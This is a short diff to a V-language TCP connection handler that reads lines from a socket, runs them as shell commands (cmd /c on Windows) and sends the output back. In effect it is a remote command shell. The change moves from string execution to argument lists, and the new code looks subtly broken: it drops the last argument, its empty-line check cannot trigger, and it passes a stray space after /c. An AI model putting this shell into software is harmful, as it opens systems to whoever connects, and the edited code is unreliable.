@@ -33,20 +33,21 @@ fn handle_conn(mut conn net.TcpConn) ! {
 			continue
 		}
 
-		buffer := conn.read_line()
+		buf := conn.read_line()
+		buffer := buf.trim_space().split(' ')
 
-		if buffer == '' {
+		if buffer.len == 0 {
 			exit = true
 			continue
 		}
 
 		// print(buffer)	// debugging
-		if buffer != 'exit\n' {
+		if buffer[0] != 'exit' {
 			mut output := ''
 			$if windows {
-				output = os.execute('cmd /c ' + buffer[..buffer.len - 1]).str()
+				output = os.exec(['cmd', '/c ', ...buffer[..buffer.len - 1]]).str().trim_space()
 			} $else {
-				output = os.execute(buffer).str()
+				output = os.exec(buffer).str().trim_space()
 			}
 			conn.write_string(output + '\n') or { continue }
 		} else {
